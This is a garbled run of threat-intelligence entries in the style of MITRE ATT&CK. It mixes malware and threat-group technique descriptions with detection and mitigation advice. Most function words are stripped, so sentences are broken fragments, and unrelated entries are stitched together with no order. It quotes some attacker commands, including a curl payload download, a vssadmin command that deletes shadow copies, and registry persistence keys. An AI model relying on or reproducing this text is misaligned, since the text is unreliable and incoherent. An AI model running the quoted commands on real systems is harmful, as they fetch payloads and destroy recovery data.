interface.(Citation: Reg) (Citation: Talos Cobalt July 2018)(Citation: PTSecurity Cobalt Aug 2017)(Citation: IB Cobalt Aug 2017)(Citation: Proofpoint Cobalt June 2017) (Citation: RiskIQ Cobalt Nov 2017)(Citation: RiskIQ Cobalt Jan 2018)(Citation: Crowdstrike Global Threat Report Feb 2018)(Citation: TrendMicro Cobalt Nov 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: District Court NY APT10 Indictment December 2018) [REvil](https://attack.mitre.org/software/S0496) token user launched explorer.exe process avoid desktop user.(Citation: McAfee Sodinokibi October 2019) [SslMM](https://attack.mitre.org/software/S0058) identifies kills anti-malware processes.(Citation: Baumgartner Naikon 2015) [Dragonfly](https://attack.mitre.org/groups/G0035) SMB C2.(Citation: US-CERT TA18-074A) [PLAINTEE](https://attack.mitre.org/software/S0254) gains persistence adding Registry key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>.(Citation: Rancor Unit42 June 2018) [CreepySnail](https://attack.mitre.org/software/S1024) PowerShell execution, including cmdlets `Invoke-WebRequst` `Invoke-Expression`.(Citation: POLONIUM June 2022) Monitor executed commands arguments enumerate files directories search specific locations host network share file system. network devices, monitor executed commands AAA logs, unexpected unauthorized users. [Leafminer](https://attack.mitre.org/groups/G0077) infected victims watering holes.(Citation: Symantec Leafminer July 2018) [Rover](https://attack.mitre.org/software/S0090) functionality remove Registry key persistence cleanup procedure.(Citation: Palo Alto Rover) [TA505](https://attack.mitre.org/groups/G0092) signed payloads code signing certificates Thawte Sectigo.(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019)(Citation: Trend Micro TA505 June 2019) [StrifeWater](https://attack.mitre.org/software/S1034) enumerate files compromised host.(Citation: Cybereason StrifeWater Feb 2022) [Emissary](https://attack.mitre.org/software/S0082) capability execute command <code>net start</code> interact services.(Citation: Emissary Trojan Feb 2016) [Metamorfo](https://attack.mitre.org/software/S0455) digitally signed executables AVAST Software certificates.(Citation: Medium Metamorfo Apr 2020)  (Citation: TrendMicro POWERSTATS V3 June 2019) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) created key named <code>Dropbox Update Setup</code> mask persistence mechanism malicious binary.(Citation: Zscaler APT31 Covid-19 October 2020) [POWERSTATS](https://attack.mitre.org/software/S0223) encrypted C2 traffic RSA.(Citation: FireEye MuddyWater Mar 2018) [POWERSTATS](https://attack.mitre.org/software/S0223) character replacement, [PowerShell](https://attack.mitre.org/techniques/T1059/001) environment variables, XOR encoding obfuscate code. [POWERSTATS](https://attack.mitre.org/software/S0223)'s backdoor code multi-layer obfuscated, encoded, compressed blob. (Citation: FireEye MuddyWater Mar 2018)(Citation: ClearSky MuddyWater Nov 2018) [POWERSTATS](https://attack.mitre.org/software/S0223) PowerShell code custom string obfuscation (Citation: TrendMicro POWERSTATS V3 June 2019) [HOPLIGHT](https://attack.mitre.org/software/S0376) uncommon TCP "high port" "high port" communication.(Citation: US-CERT HOPLIGHT Apr 2019)	 Monitor executed commands arguments abuse Outlook forms persistence compromised system. released PowerShell script safely gather mail forwarding rules custom forms mail environment steps interpret output.(Citation: Detect Outlook Forms) [XAgentOSX](https://attack.mitre.org/software/S0161) getProcessList function <code>ps aux</code> running processes.(Citation: XAgentOSX 2017) Automatically events log server data repository prevent conditions adversary locate manipulate data local system. possible, minimize time delay event reporting avoid prolonged storage local system.  Monitor newly created processes modify kernel automatically execute programs boot. monitoring process resource usage determine anomalous activity malicious hijacking resources CPU, memory, graphics processing resources. technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [T9000](https://attack.mitre.org/software/S0098) encrypts collected data single byte XOR key.(Citation: Palo Alto T9000 Feb 2016) Monitor executed commands arguments steal data exfiltrating symmetrically encrypted network protocol existing command control channel. [MCMD](https://attack.mitre.org/software/S0500) scheduled tasks persistence.(Citation: Secureworks MCMD July 2019) [Lucifer](https://attack.mitre.org/software/S0532) execute TCP, UDP,  denial service (DoS) attacks.(Citation: Unit 42 Lucifer June 2020) [GoldMax](https://attack.mitre.org/software/S0588) download execute additional files.(Citation: MSTIC NOBELIUM Mar 2021)(Citation: FireEye SUNSHUTTLE Mar 2021) Restrict administrator accounts individuals possible, privilege principles.  Prevent credential overlap systems administrator privileged accounts, network non-network platforms, servers endpoints. [REvil](https://attack.mitre.org/software/S0496) HTTPS communication C2.(Citation: Cylance Sodinokibi July 2019)(Citation: Secureworks GandCrab REvil September 2019)(Citation: McAfee Sodinokibi October 2019)(Citation: Intel 471 REvil March 2020)(Citation: Secureworks REvil September 2019) [Grandoreiro](https://attack.mitre.org/software/S0531) compromised websites Google Ads bait victims downloading installer.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: IBM Grandoreiro April 2020) Monitor unusual kernel driver installation activity erase contents storage devices specific systems network interrupt availability network resources. [Sys10](https://attack.mitre.org/software/S0060) collects local IP address victim sends C2.(Citation: Baumgartner Naikon 2015) [Machete](https://attack.mitre.org/groups/G0095) distributed [Machete](https://attack.mitre.org/software/S0409) fake blog website.(Citation: Securelist Machete Aug 2014) [Calisto](https://attack.mitre.org/software/S0274) launchctl enable screen sharing victim’s machine.(Citation: Securelist Calisto July 2018) [PlugX](https://attack.mitre.org/software/S0013) operator capture screenshots.(Citation: CIRCL PlugX March 2013) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery.
 [ftp](https://attack.mitre.org/software/S0095) abused adversaries transfer tools files external compromised environment.(Citation: FTP)(Citation: Linux FTP) [esentutl](https://attack.mitre.org/software/S0404) files URL.(Citation: LOLBAS Esentutl) [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) registered domains designed relevant student targets India.(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Saint Bot](https://attack.mitre.org/software/S1018) enumerated running processes compromised host determine running process `dfrgui.exe`.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Siloscape](https://attack.mitre.org/software/S0623) obfuscated obfuscated API calls.(Citation: Unit 42 Siloscape Jun 2021) Ensure Launch Agent's <code> ProgramArguments </code> key executables located <code>/tmp</code> <code>/shared</code> folders alignment enterprise policy. Ensure Launch Agents <code>RunAtLoad</code> key set <code>true</code> alignment policy. [ObliqueRAT](https://attack.mitre.org/software/S0644) specific files, webcam captures, screenshots local directories.(Citation: Talos Oblique RAT March 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) exfiltrate collected host C2 server.(Citation: Cybereason Kimsuky November 2020) [UNC2452](https://attack.mitre.org/groups/G0118) <code>fsutil</code> check space executing actions create files disk.(Citation: Deep Dive Solorigate January 2021) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors [Empire](https://attack.mitre.org/software/S0363) gather local information.(Citation: Talos Frankenstein June 2019) [Operation CuckooBees](https://attack.mitre.org/campaigns/C0012), threat actors `net session`, `net use`, `netstat` commands advanced reconnaissance.(Citation: Cybereason OperationCuckooBees 2022) [GLOOXMAIL](https://attack.mitre.org/software/S0026) communicates servers operated Google Jabber/XMPP protocol.(Citation: Mandiant APT1)(Citation: CyberESI GTALK) [Leviathan](https://attack.mitre.org/groups/G0065) DLL SeDll decrypt execute JavaScript backdoors.(Citation: Proofpoint Leviathan Oct 2017) (Citation: FireEye APT32 2017) [LaZagne](https://attack.mitre.org/software/S0349) credential running Linux processes.(Citation: GitHub LaZagne Dec 2018) [Kevin](https://attack.mitre.org/software/S1020) sleep time interval C2 communication attempts.(Citation: Kaspersky Lyceum October 2021) [NETEAGLE](https://attack.mitre.org/software/S0034) detect proxy configured infected machine, send beacons UDP/6000. Also, retrieving C2 IP address Port Number, [NETEAGLE](https://attack.mitre.org/software/S0034) initiate TCP connection socket. ensuing connection plaintext C2 channel commands DWORDs.(Citation: FireEye APT30) [Babuk](https://attack.mitre.org/software/S0638) ability enumerate network shares.(Citation: Sogeti CERT ESEC Babuk March 2021) [Agent Tesla](https://attack.mitre.org/software/S0331) capability kill running analysis processes AV software.(Citation: Fortinet Agent Tesla June 2017) discovery modules [Duqu](https://attack.mitre.org/software/S0038) collect windows.(Citation: Symantec W32.Duqu) Monitor command-line arguments script execution subsequent behavior. Actions network Discovery, Collection, scriptable post-compromise behaviors indicators detection leading source script. Scripts perform actions effects generate events, depending types monitoring used.  [APT29](https://attack.mitre.org/groups/G0016) <code>Rundll32.exe</code> execute payloads.(Citation: - Customer Guidance Nation-State Cyber Attacks)(Citation: Deep Dive Solorigate January 2021)(Citation: FireEye APT29 Nov 2018) [menuPass](https://attack.mitre.org/groups/G0045) stages data prior exfiltration multi-part archives, saved Recycle Bin.(Citation: PWC Cloud Hopper April 2017) [Leviathan](https://attack.mitre.org/groups/G0065) staged data remotely prior exfiltration.(Citation: CISA AA21-200A APT40 July 2021) [LAPSUS$](https://attack.mitre.org/groups/G1004) global admin role accounts created targeted organization's cloud instances.(Citation: MSTIC DEV-0537 Mar 2022) [BlackEnergy](https://attack.mitre.org/software/S0089) keylogger plug-in victim.(Citation: Securelist BlackEnergy Nov 2014) [PsExec](https://attack.mitre.org/software/S0029) ability remotely create accounts target systems.(Citation: NCC Fivehands June 2021) [SEASHARPEE](https://attack.mitre.org/software/S0185) shell.(Citation: FireEye APT34 Webinar Dec 2017) [Carbanak](https://attack.mitre.org/groups/G0008) named malware "svchost.exe," Windows shared service host program.(Citation: Kaspersky Carbanak) [TrickBot](https://attack.mitre.org/software/S0266) steal passwords KeePass source password manager.(Citation: Cyberreason Anchor December 2019) Audit images deployed environment ensure malicious components. [SILENTTRINITY](https://attack.mitre.org/software/S0692) gather Windows Vault credentials.(Citation: GitHub SILENTTRINITY Modules July 2019)  [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors Visual Basic scripts.(Citation: Cylance Dust Storm) [LazyScripter](https://attack.mitre.org/groups/G0140) batch files deploy open-source multi-stage RATs.(Citation: MalwareBytes LazyScripter Feb 2021) [HEXANE](https://attack.mitre.org/groups/G1001) downloaded additional payloads malicious scripts compromised host.(Citation: Kaspersky Lyceum October 2021) [FIN7](https://attack.mitre.org/groups/G0046) collected files sensitive compromised network.(Citation: CrowdStrike Carbon Spider August 2021) [Operation Honeybee](https://attack.mitre.org/campaigns/C0006), threat actors legitimate Windows executable secure directory payloads bypass UAC.(Citation: McAfee Honeybee)  Monitor cloud logs API calls unusual activity block object storage enumeration. Discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Collection Exfiltration, based obtained. (Citation: FireEye Enemy FIN8 Aug 2016) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) capture store keystrokes.(Citation: CISA EB Aug 2020) [adbupd](https://attack.mitre.org/software/S0202) WMI script achieve persistence.(Citation: PLATINUM April 2016) Monitor DLL/PE file events, creation binary files loading DLLs processes. DLLs recognized loaded process. [NativeZone](https://attack.mitre.org/software/S0637) has, execution, displayed message box appears Ukrainian electronic document management system.(Citation: SentinelOne NobleBaron June 2021) [Bonadan](https://attack.mitre.org/software/S0486) maliciously altered OpenSSH binary targeted systems create backdoor.(Citation: ESET ForSSHe December 2018) (Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020) [FlawedAmmyy](https://attack.mitre.org/software/S0381) SEAL encryption initial C2 handshake.(Citation: Proofpoint TA505 Mar 2018) [UNC2452](https://attack.mitre.org/groups/G0118) developed [SUNSPOT](https://attack.mitre.org/software/S0562), [SUNBURST](https://attack.mitre.org/software/S0559), [TEARDROP](https://attack.mitre.org/software/S0560), [Raindrop](https://attack.mitre.org/software/S0565); [SUNSPOT](https://attack.mitre.org/software/S0562) [SUNBURST](https://attack.mitre.org/software/S0559) tailored incorporated SolarWind's Orion software library.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: CrowdStrike SUNSPOT Implant January 2021)(Citation: Deep Dive Solorigate January 2021) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors discovered local disks attached hardware including manufacturer model, OS versions systems connected targeted network.(Citation: FoxIT Wocao December 2019) [xCaon](https://attack.mitre.org/software/S0653) command start interactive shell.(Citation: Checkpoint IndigoZebra July 2021) Monitor executed commands arguments arguments actions collect combine files. Remote access tools built-in features interact Windows API gather location. Data acquired staged Windows management tools Windows Management Instrumentation PowerShell. (Citation: ESET BackdoorDiplomacy Jun 2021) [Epic](https://attack.mitre.org/software/S0091) gathers local names.(Citation: Kaspersky Turla Aug 2014) [Elise](https://attack.mitre.org/software/S0081) communicates HTTPS C2.(Citation: Lotus Blossom Jun 2015) [FunnyDream](https://attack.mitre.org/software/S1044) Native API defense evasion, discovery, collection.(Citation: Bitdefender FunnyDream Campaign November 2020) [MobileOrder](https://attack.mitre.org/software/S0079) command upload C2 server files victim mobile device, including card size, installed app list, SMS content, contacts, calling history.(Citation: Scarlet Mimic Jan 2016) [Clop](https://attack.mitre.org/software/S0611) delete shadow volumes <code>vssadmin Delete Shadows /all /quiet</code> bcdedit disable recovery options.(Citation: Mcafee Clop Aug 2019) [InnaputRAT](https://attack.mitre.org/software/S0259) variants establish persistence modifying Registry key <code>HKU\<SID>\Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe</code>.(Citation: ASERT InnaputRAT April 2018) [BLUELIGHT](https://attack.mitre.org/software/S0657) enumerate files collect metadata.(Citation: Volexity InkySquid BLUELIGHT August 2021) Monitor user authentication attempts. classic Pass-The-Hash perspective, technique hash NTLMv1 / NTLMv2 protocol authenticate compromised endpoint. technique touch Kerberos. Therefore, NTLM LogonType 3 authentications domain login anonymous logins suspicious. Over-Pass-The-Hash perspective, adversary exchange hash Kerberos authentication ticket (TGT). creating sacrificial logon session dummy credentials (LogonType 9) inject hash session triggers Kerberos authentication process. [GOLD SOUTHFIELD](https://attack.mitre.org/groups/G0115) publicly-accessible RDP remote management monitoring (RMM) servers gain access victim machines.(Citation: Secureworks REvil September 2019)	 victim PowerShell 3.0 later, [POWERSOURCE](https://attack.mitre.org/software/S0145) writes decoded payload alternate data stream (ADS) named kernel32.dll saved <code>%PROGRAMDATA%\Windows\</code>.(Citation: Cisco DNSMessenger March 2017) [OSInfo](https://attack.mitre.org/software/S0165) enumerated local administrators group.(Citation: Symantec Buckeye) [HyperBro](https://attack.mitre.org/software/S0398) ability application (<code>CreateProcessW</code>) script/file (<code>ShellExecuteW</code>) API.(Citation: Unit42 Emissary Panda 2019) Monitor executed commands arguments actions collect internal data. [Gold Dragon](https://attack.mitre.org/software/S0249) cmd.exe execute commands discovery.(Citation: McAfee Gold Dragon) [Peirates](https://attack.mitre.org/software/S0683) query query AWS GCP metadata APIs secrets.(Citation: Peirates GitHub) [Zeus Panda](https://attack.mitre.org/software/S0330) encrypts strings XOR obfuscates macro code initial payload. [Zeus Panda](https://attack.mitre.org/software/S0330) encrypts configuration settings AES RC4.(Citation: Talos Zeus Panda Nov 2017)(Citation: GDATA Zeus Panda June 2017) [APT3](https://attack.mitre.org/groups/G0022) tool creates service persistence.(Citation: FireEye Operation Double Tap) [RATANKBA](https://attack.mitre.org/software/S0241) command <code>reg query “HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings”</code>.(Citation: RATANKBA) Monitor executed commands arguments check Internet connectivity compromised systems. Monitor quantity files unexpected modifications user directories C:\Windows\System32\. [Confucius](https://attack.mitre.org/groups/G0142) mshta.exe execute malicious VBScript.(Citation: TrendMicro Confucius APT Feb 2018)  [Zebrocy](https://attack.mitre.org/software/S0251) SSL AES ECB encrypting C2 communications.(Citation: ESET Zebrocy Nov 2018)(Citation: ESET Zebrocy 2019)(Citation: CISA Zebrocy Oct 2020)  Ensure permissions properly set folders sensitive private prevent unintended access. [CosmicDuke](https://attack.mitre.org/software/S0050) searches Outlook data files extensions .pst .ost collection exfiltration.(Citation: F-Secure Cosmicduke) [APT41](https://attack.mitre.org/groups/G0096) leveraged follow exploits operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, CVE-2019-3396.(Citation: FireEye APT41 Aug 2019)  [C0015](https://attack.mitre.org/campaigns/C0015), threat actors employed code `regsvr32` execution.(Citation: DFIR Conti Bazar Nov 2021) [Epic](https://attack.mitre.org/software/S0091) encrypts commands C2 server hardcoded key.(Citation: Kaspersky Turla) [Lazarus Group](https://attack.mitre.org/groups/G0032) renamed malicious code disguise Microsoft's narrator legitimate files.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020)(Citation: ESET Lazarus Jun 2020)(Citation: Qualys LolZarus) [TEARDROP](https://attack.mitre.org/software/S0560) decoded custom rolling XOR algorithm execute customized [Cobalt Strike](https://attack.mitre.org/software/S0154) payload.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Check Sunburst Teardrop December 2020)(Citation: Deep Dive Solorigate January 2021) (Citation: FireEye EPS Awakens 2) [Turla](https://attack.mitre.org/groups/G0010) <code>net "Domain Admins" /domain</code> identify domain administrators.(Citation: ESET ComRAT 2020) [Pillowmint](https://attack.mitre.org/software/S0517) collected credit card data native API functions.(Citation: Trustwave Pillowmint June 2020) [RDFSNIFFER](https://attack.mitre.org/software/S0416) Win32 API functions interact victim machine.(Citation: FireEye FIN7 Oct 2019) Monitor executed commands arguments abuse Outlook rules persistence compromised system. released PowerShell script safely gather mail forwarding rules custom forms mail environment steps interpret output.(Citation: Detect Outlook Forms) PowerShell script ineffective gathering rules modified PR_RULE_MSG_NAME PR_RULE_MSG_PROVIDER properties caused adversaries Exchange Server Messaging API Editor (MAPI Editor), examination Exchange Administration tool MFCMapi reveal mail forwarding rules.(Citation: Pfammatter - Hidden Inbox Rules) [Aquatic Panda](https://attack.mitre.org/groups/G0143) publicly accessible DNS logging services identify servers vulnerable Log4j (CVE 2021-44228).(Citation: CrowdStrike AQUATIC PANDA December 2021) [SeaDuke](https://attack.mitre.org/software/S0053) capable persisting Registry key .lnk file stored Startup directory.(Citation: Unit 42 SeaDuke 2015) endpoint security solutions configured block types process injection based common sequences behavior occur injection process. example, Windows 10, Attack Surface Reduction (ASR) rules prevent Office applications code injection. (Citation: win10_asr) (Citation: FireEye Periscope March 2018)(Citation: CISA AA21-200A APT40 July 2021) [Empire](https://attack.mitre.org/software/S0363) acquire local domain user account information.(Citation: Github PowerShell Empire) Follow practices design administration enterprise network limit privileged account administrative tiers.(Citation: Tilbury Windows Credentials) [Stolen Pencil](https://attack.mitre.org/groups/G0086) tools capable obtaining credentials saved mail.(Citation: Netscout Stolen Pencil Dec 2018) (Citation: FireEye APT28) [SYSCON](https://attack.mitre.org/software/S0464) ability FTP C2 communications.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020) [Javali](https://attack.mitre.org/software/S0528) read C2 Google Documents YouTube.(Citation: Securelist Brazilian Banking Malware July 2020) [Siloscape](https://attack.mitre.org/software/S0623) send kubectl commands victim clusters IRC channel kubectl locally spread victim cluster.(Citation: Unit 42 Siloscape Jun 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) restored malicious [KernelCallbackTable](https://attack.mitre.org/techniques/T1574/013) code original process execution flow hijacked.(Citation: Lazarus APT January 2022) [SILENTTRINITY](https://attack.mitre.org/software/S0692) `System` namespace methods execute lateral movement DCOM.(Citation: GitHub SILENTTRINITY Modules July 2019) [Mori](https://attack.mitre.org/software/S1047) delete DLL file files Registry value.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [Inception](https://attack.mitre.org/groups/G0100) specific malware modules gather domain membership.(Citation: Symantec Inception Framework March 2018) Windows 10, enable Attack Surface Reduction (ASR) rules block processes created [PsExec](https://attack.mitre.org/software/S0029) running. (Citation: win10_asr) Monitor API calls forge cookies gain access applications Internet services. Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate activity network level.  [OilRig](https://attack.mitre.org/groups/G0049) WMI execution.(Citation: FireEye APT34 Webinar Dec 2017) [PoshC2](https://attack.mitre.org/software/S0378) module exploiting SMB EternalBlue.(Citation: GitHub PoshC2) [CookieMiner](https://attack.mitre.org/software/S0492) checked presence "Little Snitch", macOS network monitoring application firewall software, stopping exiting found.(Citation: Unit42 CookieMiner Jan 2019) [Goopy](https://attack.mitre.org/software/S0477) ability exfiltrate documents infected systems.(Citation: Cybereason Cobalt Kitty 2017)	 [GoldenSpy](https://attack.mitre.org/software/S0493)'s installer delayed installation [GoldenSpy](https://attack.mitre.org/software/S0493) hours reaches victim system.(Citation: Trustwave GoldenSpy June 2020)	 (Citation: Kaspersky Turla) Monitor creation files installer packages abused malicious execution. [Dragonfly](https://attack.mitre.org/groups/G0035) spearphishing PDF attachments malicious links redirected credential harvesting websites.(Citation: US-CERT TA18-074A) [KeyBoy](https://attack.mitre.org/software/S0387) command perform screen grabbing.(Citation: PWC KeyBoys Feb 2017)  [Machete](https://attack.mitre.org/groups/G0095) delivered spearphishing emails zipped file malicious contents.(Citation: Securelist Machete Aug 2014)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020) Monitor attempt user gain access network computing resource providing credentials (ex: Windows EID 1202) alternate authentication material, password hashes, Kerberos tickets, application access tokens, laterally environment bypass normal access controls. [Felismus](https://attack.mitre.org/software/S0171) samples custom method C2 traffic utilizes Base64.(Citation: Forcepoint Felismus Mar 2017) [Turla](https://attack.mitre.org/groups/G0010) Registry store encrypted payloads.(Citation: ESET Turla PowerShell 2019)(Citation: Symantec Waterbug Jun 2019) vendors embedded network devices provide cryptographic signing ensure integrity operating images boot time.  Implement available, vendor guidelines. (Citation: Cisco IOS Software Integrity Assurance - Secure Boot) [BADFLICK](https://attack.mitre.org/software/S0642) captured victim IP address details.(Citation: Accenture MUDCARP March 2019) [Remsec](https://attack.mitre.org/software/S0125) network configuration, including routing table, ARP cache, DNS cache.(Citation: Kaspersky ProjectSauron Technical Analysis) (Citation: Mandiant Easy Breach) [Cobalt Group](https://attack.mitre.org/groups/G0080) Registry persistence. set Startup path launch PowerShell command download Cobalt Strike.(Citation: IB Cobalt Aug 2017) [Bandook](https://attack.mitre.org/software/S0234) ShellExecuteW() function call.(Citation: CheckPoint Bandook Nov 2020)  [ccf32](https://attack.mitre.org/software/S1043) parse collected files identify specific file extensions.(Citation: Bitdefender FunnyDream Campaign November 2020) [zwShell](https://attack.mitre.org/software/S0350) logged-in user victim.(Citation: McAfee Night Dragon) [Kimsuky](https://attack.mitre.org/groups/G0094) Win7Elevate inject malicious code explorer.exe.(Citation: Securelist Kimsuky Sept 2013) [Mythic](https://attack.mitre.org/software/S0699) supports scripting file downloads agents.(Citation: Mythc Documentation)	 Segregate SNMP traffic separate management network.(Citation: US-CERT TA17-156A SNMP Abuse 2017) [Lazarus Group](https://attack.mitre.org/groups/G0032) conducted word searches compromised machines identify specific documents interest. [Lazarus Group](https://attack.mitre.org/groups/G0032) malware common function identify target files extension, enumerate files directories, including Destover-like variant lists files gathers drives.(Citation: Novetta Blockbuster)(Citation: McAfee GhostSecret)(Citation: ClearSky Lazarus Aug 2020)(Citation: Lazarus APT January 2022)(Citation: Qualys LolZarus) [Derusbi](https://attack.mitre.org/software/S0021) backup communication method beacon.(Citation: Fidelis Turbo) [LAPSUS$](https://attack.mitre.org/groups/G1004) DCSync attacks gather credentials privilege escalation routines.(Citation: MSTIC DEV-0537 Mar 2022) [menuPass](https://attack.mitre.org/groups/G0045) RDP connections victim network.(Citation: PWC Cloud Hopper April 2017)(Citation: District Court NY APT10 Indictment December 2018) [OSX/Shlayer](https://attack.mitre.org/software/S0402) download payloads, extract bytes files. [OSX/Shlayer](https://attack.mitre.org/software/S0402) <code>curl -fsL "$url" >$tmp_path</code> command download malicious payloads temporary directory.(Citation: Carbon Black Shlayer Feb 2019)(Citation: sentinelone shlayer zshlayer)(Citation: 20 macOS Common Tools Techniques)(Citation: objectivesee osx.shlayer apple approved 2020) [FruitFly](https://attack.mitre.org/software/S0277) saves leading "." hidden file.(Citation: objsee mac malware 2017) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [OilRig](https://attack.mitre.org/groups/G0049) Putty access compromised systems.(Citation: Unit 42 Playbook Dec 2017) [Chimera](https://attack.mitre.org/groups/G0114) legitimate credentials login external VPN, Citrix, SSH, remote services.(Citation: Cycraft Chimera April 2020)(Citation: NCC Chimera January 2021) [RedLeaves](https://attack.mitre.org/software/S0153) logged user locally Remote Desktop sessions.(Citation: PWC Cloud Hopper Technical Annex April 2017) [Volgmer](https://attack.mitre.org/software/S0180) stores encoded configuration file Registry key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Security</code>.(Citation: US-CERT Volgmer 2 Nov 2017)(Citation: Symantec Volgmer Aug 2014) [Squirrelwaffle](https://attack.mitre.org/software/S1030) obfuscated XOR-based algorithm.(Citation: ZScaler Squirrelwaffle Sep 2021)(Citation: Netskope Squirrelwaffle Oct 2021) (Citation: SentinelOne NobleBaron June 2021) [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools delete files operation.(Citation: TrendMicro Gamaredon April 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021) Monitor attempts enable scripts running considered suspicious. scripts commonly system, enabled, scripts running cycle patching administrator functions suspicious. Scripts captured file determine actions intent.  [HyperBro](https://attack.mitre.org/software/S0398) delivered encrypted compromised host.(Citation: Trend Micro DRBControl February 2020) (Citation: FireEye SUNBURST Backdoor December 2020) [ComRAT](https://attack.mitre.org/software/S0126) PowerShell load time user logs system. [ComRAT](https://attack.mitre.org/software/S0126) execute PowerShell scripts loaded memory file system.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020) Monitor newly executed processes wipe corrupt raw disk data specific systems network interrupt availability network resources. [Fox Kitten](https://attack.mitre.org/groups/G0117) protocol tunneling communication RDP activity compromised hosts source tools [Ngrok](https://attack.mitre.org/software/S0508) custom tool SSHMinion.(Citation: CrowdStrike PIONEER KITTEN August 2020)(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) [Pupy](https://attack.mitre.org/software/S0192) PowerView Pywerview perform discovery commands user, group, local group, etc.(Citation: GitHub Pupy) [Machete](https://attack.mitre.org/software/S0409) data FTP failed, fallback server.(Citation: ESET Machete July 2019)  [Sibot](https://attack.mitre.org/software/S0589) executed downloaded DLLs <code>rundll32.exe</code>.(Citation: MSTIC NOBELIUM Mar 2021) [Taidoor](https://attack.mitre.org/groups/G0015) RC4 encrypt message body content.(Citation: TrendMicro Taidoor) [GRIFFON](https://attack.mitre.org/software/S0417) persistence module stores implant Registry, executes logon.(Citation: SecureList Griffon 2019) Monitor newly constructed network connections received untrusted hosts.  [CallMe](https://attack.mitre.org/software/S0077) capability download file victim C2 server.(Citation: Scarlet Mimic Jan 2016) [ShimRat](https://attack.mitre.org/software/S0444) Windows API functions install service shim.(Citation: FOX-IT 2016 Mofang)	 [PUNCHBUGGY](https://attack.mitre.org/software/S0196) [PowerShell](https://attack.mitre.org/techniques/T1059/001) decode base64-encoded assembly.(Citation: Morphisec ShellTea June 2019) Disk check, forensic utilities, data device drivers processes API calls) reveal anomalies warrant deeper investigation technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [TinyZBot](https://attack.mitre.org/software/S0004) disable Avira anti-virus.(Citation: Cylance Cleaver) [FIN7](https://attack.mitre.org/groups/G0046) created Windows services startup directories persistence.(Citation: FireEye FIN7 Aug 2018) [Ke3chang](https://attack.mitre.org/groups/G0004) 7Zip RAR passwords encrypt data prior exfiltration.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NICKEL December 2021) Adversaries instruct [Duqu](https://attack.mitre.org/software/S0038) spread laterally copying shares enumerated legitimate credentials (via keylogging means). remote host infected compromised credentials schedule task remote machines executes malware.(Citation: Symantec W32.Duqu) Enforce principle least-privilege. domain user local administrator multiple systems. [AADInternals](https://attack.mitre.org/software/S0677) gather encryption Azure services ADSync Active Directory Federated Services servers.(Citation: AADInternals Documentation) [NOKKI](https://attack.mitre.org/software/S0353) unique, custom de-obfuscation technique.(Citation: Unit 42 NOKKI Sept 2018) Monitor processes arguments highlight adversary actions modify Registry values (ex: <code>reg.exe</code>) modify/replace legitimate <code>termsrv.dll</code>. [MacSpy](https://attack.mitre.org/software/S0282) record sounds microphones computer.(Citation: objsee mac malware 2017) Monitor executed commands arguments abuse Office add-ins persistence compromised system.  [Doki](https://attack.mitre.org/software/S0600) disguised file Linux kernel module.(Citation: Intezer Doki July 20) (Citation: Symantec Thrip June 2018) [PowerSploit](https://attack.mitre.org/software/S0194)'s <code>Install-SSP</code> Persistence module establish installing SSP DLL.(Citation: GitHub PowerSploit 2012)(Citation: PowerSploit Documentation) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Astaroth](https://attack.mitre.org/software/S0373) external software NetPass recover passwords. (Citation: Cybereason Astaroth Feb 2019) [POSHSPY](https://attack.mitre.org/software/S0150) downloads executes additional PowerShell code Windows binaries.(Citation: FireEye POSHSPY April 2017) Limit privileges user accounts remediate Privilege Escalation vectors authorized administrators create scheduled tasks remote systems. Linux environments, users account-level access <code>[at](https://attack.mitre.org/software/S0110)</code> managed <code>at.allow</code> <code>at.deny</code> files. Users listed at.allow enabled schedule actions at, users listed at.deny file disabled utility. [Dtrack](https://attack.mitre.org/software/S0567)’s dropper list running processes.(Citation: Securelist Dtrack)(Citation: CyberBit Dtrack) files immutable changeable administrators limit ability adversaries easily create user level persistence. 